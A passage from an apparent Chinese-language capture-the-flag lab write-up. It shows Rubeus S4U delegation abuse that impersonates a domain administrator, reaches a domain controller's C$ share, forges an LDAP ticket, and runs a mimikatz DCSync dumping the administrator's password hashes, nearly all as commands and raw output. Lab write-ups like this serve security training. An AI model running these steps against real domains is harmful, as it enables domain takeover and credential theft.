ggF+zY2LAcKDPf0RxujgekwgeagAwIBAKKB3gSB232B2DCB1aCB0jCBzzCBzKArMCmgAwIBEqEiBCAenQjzA4cRZ/q00xnKQQJmo64nZ99Clb4a3mOFS84bkaETGxFNRUdBQUlSTElORS5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAEChAAClERgPMjAyNjAzMjUxNTQ1NTNaphEYDzIwMjYwMzI2MDE0NTUzWqcRGA8yMDI2MDQwMTE1NDU1M1qoExsRTUVHQUFJUkxJTkUuTE9DQUypFTAToAMCAQGhDDAKGwhwcml2ZXNjJA==

[*] Impersonating user 'administrator' to target SPN 'CIFS/DC2.megaairline.local'
[*] Building S4U2proxy request for service: 'CIFS/DC2.megaairline.local'
[*] Using domain controller: DC2 (192.168.11.201)
[*] Sending S4U2proxy request to domain controller 192.168.11.201:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/DC2.megaairline.local':

      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
[+] Ticket successfully imported!
```

## 验证访问
```bash
PS C:\Users\elliot.MS01\Downloads> ls \\DC2.megaairline.local\c$


    Directory: \\DC2.megaairline.local\c$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/10/2020   6:48 AM                PerfLogs
d-r---       10/22/2024   6:01 AM                Program Files
d-----        9/15/2018  12:21 AM                Program Files (x86)
d-r---        4/29/2020  11:20 AM                Users
d-----       10/23/2024   5:28 AM                Windows
```

## 获取 LDAP 票据用于 DCSync
> 使用相同的 S4U 技巧，但通过 /altservice:LDAP 参数，获取 LDAP 服务的服务票据（用于 DCSync）
>
> /altservice:LDAP 将最终票据的服务名替换为 LDAP，从而获得访问 LDAP 服务（域控）的权限，这是进行 DCSync 的前提
>

```bash
PS C:\Users\elliot.MS01\Downloads> .\Rubeus.exe s4u /domain:megaairline.local /dc:DC2 /user:privesc$ /rc4:FA7665BEFE243A5079D1C602F5524CE0 /impersonateuser:administrator /msdsspn:CIFS/DC2.megaairline.local /altservice:LDAP /ptt /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using rc4_hmac hash: FA7665BEFE243A5079D1C602F5524CE0
[*] Building AS-REQ (w/ preauth) for: 'megaairline.local\privesc$'
[*] Using domain controller: 192.168.11.201:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIErjCCBKphggSmMIIEoqADAgEFoRMbEU1FR0FBSVJMSU5FLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFtZWdhYWlybGluZS5sb2NhbKOCBFwwggRYoAMCARKhAwIBAqKCBEoEggRGTLY722Rb32YNpkfFTeG6R1Gaekq0+kefVCXlq+xmHUqifAi0zihb7Ar+TwPCudfu7xXxYObhkeCjmPhgzPp2bwC34HIz7Q9a4jjH/R3Gv3uVwcmDn3qHLSGYoqvSCWdVSoxyY6bBken1805mKGBoHjtYv5vzCAd/GvExZ1ldEG0PV1UBx5bLn3JQqFe+ArZvquuqGAdzsSQvH3oHL9zEYY24BX9V6YqqvsxAEOP6Ex4aBJlNOBVLkUl1pBfV8TNLRft5itfca3rk+ZWfsnnbj9aSnKy1vugAXh4XcIJPNEUM4VOKYBb8Qe4sbHl5Zfcq40Dg+SVWG0Pm5Ail5fkIm5Hck381rW7OAcCsRUg8UKwFz6eof27P55Rj92GuDKjGsEdZyGfRM//AjvOANWpJEWhZ11yxwHv08o5+NGCjUrJoyIW1AqfsYS3HiZTm62bcwGqjmz1AD0sSlwwJiiViXGYh5aWGaT/0a63KaDypnF0wdwt0dYfjrPoZWtyQKtadNp1jql970c4O+ROZPwxCOqEHI3ASAfXD2ketVTuJTM7RLufgyo7kU60slLhHMiEMqbKG+dJ0rbkVv/UtgqppefM1ax7S9gzGAMxqBZ7sfE6mXoahW9AosF/z/FrVXk1ll71tgbPgxmzLDmNDI4vcA8TyXvhCKNG7Ilf3ts91sut6Td7xIM5lt/zz5s39Qj+vhC19pU+7GTZjvrfD5U3x0UX0R5on082VpILqRsCGukPyYv/EmFPGWU/T6V1+AEY/78Oikejd0LCawCrpS50kiXPJK37chRtySeymoo5jEo+IS7809IeausP0s9u6rKfW84XSylnx3aP9VAycI53ZjkksNCUVj3MWJfO/5ypXQAl50NrlvlM8w43MPnph7GB0+7kGFu3dD2O+QpMIao5pYal2Ic/TDpruEGdAmQI/9vWSM4e5M0v1NazQGppbHsqYn214JaVjMh4bSvDqC5VusupBTnz2A2QtNmv1Z8PgeknIpZOOzr0j2n5AJtkOPELA1tsvBaQfPLS0HJaSM/x4//30+huXOzGThZadANngw52RaonUudaHfnq/cnw0MZYHZKFj5LYb9doZ/D9N0wzAqAJzcPWghnJDtiCpQLak2nDEgzdOYy0vq+JWV0rtGazWS5cqkF7ANTsLKt9G3QDMNRvx0ZaE+oz2yJqCdjhsDGIdesXX/KSS81L0/NS551qptMaxKjeAX6tql623ywoD6gighBeTG/k8f1GBokfyhQLhmTGEfNfjVbGEj0gbXk1/LHCwjMtPx1H2pCmPzjJQpgc1CPoFmlC8CVRQwa+OJ+zwM5N1SFcgTYntHFTsebka66UPnxmQW+GzIKxXknvtU6oPwp0iDyVFiTdhqnQtWiNPNfA5wtnuUTAaPhsKvXAUHyWVDur+ZUSTnXZN9FsWu05RP/J0AEbR3AxgytLmhKMpngNrPdajgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKAbMBmgAwIBF6ESBBDvMMkmReevkaHza7xBdtBMoRMbEU1FR0FBSVJMSU5FLkxPQ0FMohUwE6ADAgEBoQwwChsIcHJpdmVzYySjBwMFAEDhAAClERgPMjAyNjAzMjUxNTQ3MjlaphEYDzIwMjYwMzI2MDE0NzI5WqcRGA8yMDI2MDQwMTE1NDcyOVqoExsRTUVHQUFJUkxJTkUuTE9DQUypJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEW1lZ2FhaXJsaW5lLmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'privesc$@MEGAAIRLINE.LOCAL'
[*] Using domain controller: DC2 (192.168.11.201)
[*] Sending S4U2self request to 192.168.11.201:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'privesc$@MEGAAIRLINE.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'administrator' to target SPN 'CIFS/DC2.megaairline.local'
[*]   Final ticket will be for the alternate service 'LDAP'
[*] Building S4U2proxy request for service: 'CIFS/DC2.megaairline.local'
[*] Using domain controller: DC2 (192.168.11.201)
[*] Sending S4U2proxy request to domain controller 192.168.11.201:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'LDAP'
[*] base64(ticket.kirbi) for SPN 'LDAP/DC2.megaairline.local':

      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
[+] Ticket successfully imported!
```

## DCSync
```bash
PS C:\Users\elliot.MS01\Downloads> .\mimikatz.exe "lsadump::dcsync /domain:megaairline.local /user:megaairline\administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:megaairline.local /user:megaairline\administrator
[DC] 'megaairline.local' will be the domain
[DC] 'DC2.megaairline.local' will be the DC server
[DC] 'megaairline\administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/10/2020 8:51:36 AM
Object Security ID   : S-1-5-21-775547830-308377188-957446042-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 674f1a5c73f4faad8ddbf7f3bf86db60
    ntlm- 0: 674f1a5c73f4faad8ddbf7f3bf86db60
    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
    lm  - 0: bc85e92d58bd49c8597dca347f447fc0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a7088e1cb0d4797ed86d814fd469b262

* Primary:Kerberos-Newer-Keys *
    Default Salt : MEGAAIRLINE.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4e12ec7a8444ee03402a6937a1c4f43874a3a2a34c4f867d8d345ae4f5ff09d7
      aes128_hmac       (4096) : 4ca23f7ba653dff3540c6e8dd3b532f0
      des_cbc_md5       (4096) : 10dccee5f7ab5279
    OldCredentials
      aes256_hmac       (4096) : f751c1e3fb7f3561c7ad63c2e7e5eef11ab54a3fe1b7b07ddc1d7dcd1ecac13d
      aes128_hmac       (4096) : 82426c7aaf013faad9b5e2340efdab17
      des_cbc_md5       (4096) : d5b01adf91ba79bf

* Primary:Kerberos *
    Default Salt : MEGAAIRLINE.LOCALAdministrator
    Credentials
      des_cbc_md5       : 10dccee5f7ab5279
    OldCredentials
      des_cbc_md5       : d5b01adf91ba79bf

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  2dff1b8de5a80cdca4b2539481e607b3
    02  c63d591a858e3df23fe6eb8bbce42138
    03  1856bda170120f629d1210965c28ebce
    04  2dff1b8de5a80cdca4b2539481e607b3
    05  5df44b3f033f841c1d07397d08f95fdc
    06  b7c938333d72cc15c88c4f015da15f59
    07  b30c9a7bd633bd6f5b13c03e52cb737e
    08  34389532e90d137ef17d64c6ec25f10e
    09  b68e83b7e3f0980992a0f8962278a4bb
    10  3f6694fbcc1a5a0bb38513b1f3564d1d
    11  c7b12fd7766c6a43e21297f7c4c7b0a3
    12  34389532e90d137ef17d64c6ec25f10e
    13  d77ad51049ba318210f6e73b9350a65c
    14  0700e002ca0915f333704e64093f9819
    15  c1691b80f5231fdd949d096f628f1bb6
    16  b9fab1dff4342a98a3040ad9279e6114
    17  15f116d4855d7a1151e3f8bcdc408bf0
    18  ee67669c50f41d7b8008671a6e81fcdd
    19  7f3038f57e6061da6e2169880e7cbc7b
    20  e6874bcf5c584e2cd85b4f24c4eece50
    21  1ed8c9a78e8d5550e2d3a8e092ecae53
    22  441bdc333c3d761cd528696e23877815
    23  4cc628ce92e7628bed8015ece32841a6
    24  aeb111bcd8a3f432db4a5a64a716f60a
    25  d57fd5dc158d07aa2dd8e615f136f11f
    26  fe6431cd7345ea0bdbe72e36a52d86aa
    27  c51b3677951d428fe715155678aa8fce
    28  fc6cbf5636059c08b66cd0f0c0902339
    29  4656a851abf9e43a622500508d4a75f5


mimikatz(commandline) # exit
Bye!
```

## Getflag
```bash
PS C:\Users\elliot.MS01\Downloads> type \\DC2.megaairline.local\c$\Users\Administrator\Desktop\flag.txt
ASCENSION{g0t_a1L_7h3_ac3s}
```

